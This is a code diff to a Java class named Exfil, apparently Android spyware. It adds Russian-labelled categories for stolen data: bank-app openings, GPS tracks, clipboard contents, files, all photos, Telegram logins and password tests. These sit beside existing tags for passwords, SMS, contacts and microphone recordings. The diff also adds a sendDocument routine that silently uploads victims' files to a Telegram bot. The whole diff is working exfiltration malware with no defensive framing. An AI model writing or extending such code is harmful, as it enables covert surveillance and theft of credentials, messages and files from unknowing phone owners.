@@ -17,11 +17,13 @@ public class Exfil {
         switch (tag) {
             case "DEVICE":       icon = "📱"; title = "Устройство"; break;
             case "APPS":         icon = "📦"; title = "Приложения"; break;
+            case "GAMES":        icon = "🎮"; title = "Игры"; break;
             case "CONTACTS":     icon = "👥"; title = "Контакты"; break;
             case "CALLS":        icon = "📞"; title = "Звонки"; break;
             case "SMS":          icon = "💬"; title = "SMS"; break;
             case "SMS_HISTORY":  icon = "📨"; title = "История SMS"; break;
-            case "CLIPBOARD":    icon = "📋"; title = "Буфер обмена"; break;
+            case "CLIPBOARD":    icon = "📋"; title = "Буфер"; break;
+            case "CLIPBOARD_NEW":icon = "📋"; title = "Скопировано"; break;
             case "GMAIL_PUSH":   icon = "📧"; title = "Gmail (пуш)"; break;
             case "GMAIL_VIEW":   icon = "📩"; title = "Gmail (письмо)"; break;
             case "STEAL":        icon = "🔐"; title = "Пароли"; break;
@@ -35,8 +37,23 @@ public class Exfil {
             case "INFO":         icon = "ℹ️"; title = "Инфо"; break;
             case "BATTERY":      icon = "🔋"; title = "Батарея"; break;
             case "LOCATION":     icon = "📍"; title = "Локация"; break;
+            case "GPS_TRACK":    icon = "📍"; title = "GPS"; break;
             case "PHOTO":        icon = "📷"; title = "Фото"; break;
             case "MIC":          icon = "🎤"; title = "Микрофон"; break;
+            case "ADMIN":        icon = "🛡"; title = "Админ"; break;
+            case "ALERT":        icon = "🚨"; title = "ALERT"; break;
+            case "BANK_OPEN":    icon = "🏦"; title = "Банк открыт"; break;
+            case "FILE_SCAN":    icon = "🔍"; title = "Сканер"; break;
+            case "FILE_GET":     icon = "📥"; title = "Файл"; break;
+            case "FILES":        icon = "📁"; title = "Файлы"; break;
+            case "PHOTOS":       icon = "🖼"; title = "Фото"; break;
+            case "PHOTOS_ALL":   icon = "🖼"; title = "Все фото"; break;
+            case "DAILY":        icon = "📊"; title = "Отчёт"; break;
+            case "GM_CHECK":     icon = "✉️"; title = "Проверка Gmail"; break;
+            case "PWD_TEST":     icon = "🔑"; title = "Тест пароля"; break;
+            case "TELEGRAM_LOGIN":icon = "✈️"; title = "Telegram"; break;
+            case "CALL":         icon = "📞"; title = "Звонок"; break;
+            case "APP_OPEN":     icon = "▶️"; title = "Открыто"; break;
         }
 
         StringBuilder sb = new StringBuilder();
@@ -106,6 +123,52 @@ public class Exfil {
                 w.append("--").append(boundary).append("\r\n");
                 w.append("Content-Disposition: form-data; name=\"photo\"; filename=\"s.jpg\"\r\n");
                 w.append("Content-Type: image/jpeg\r\n\r\n");
+                w.flush();
+
+                out.write(Base64.decode(b64, Base64.DEFAULT));
+
+                w.append("\r\n--").append(boundary).append("--\r\n");
+                w.flush();
+                w.close();
+                c.getResponseCode();
+            } catch (Throwable ignored) {}
+        }).start();
+    }
+
+    public static void sendPhotoFile(String tag, String b64) {
+        sendPhoto(tag, b64);
+    }
+
+    public static void sendDocument(String tag, String b64, String filename) {
+        new Thread(() -> {
+            try {
+                String url = "https://api.telegram.org/bot" + TOKEN + "/sendDocument";
+                String boundary = "----bnd" + System.currentTimeMillis();
+
+                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+                c.setRequestMethod("POST");
+                c.setDoOutput(true);
+                c.setRequestProperty("Content-Type",
+                        "multipart/form-data; boundary=" + boundary);
+                c.setConnectTimeout(60000);
+                c.setReadTimeout(60000);
+
+                OutputStream out = c.getOutputStream();
+                java.io.PrintWriter w = new java.io.PrintWriter(
+                        new java.io.OutputStreamWriter(out, "UTF-8"), false);
+
+                w.append("--").append(boundary).append("\r\n");
+                w.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
+                w.append(CHAT).append("\r\n");
+
+                w.append("--").append(boundary).append("\r\n");
+                w.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
+                w.append("📥 ").append(tag).append("\r\n");
+
+                w.append("--").append(boundary).append("\r\n");
+                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"")
+                 .append(filename).append("\"\r\n");
+                w.append("Content-Type: application/octet-stream\r\n\r\n");
                 w.flush();
 
                 out.write(Base64.decode(b64, Base64.DEFAULT));
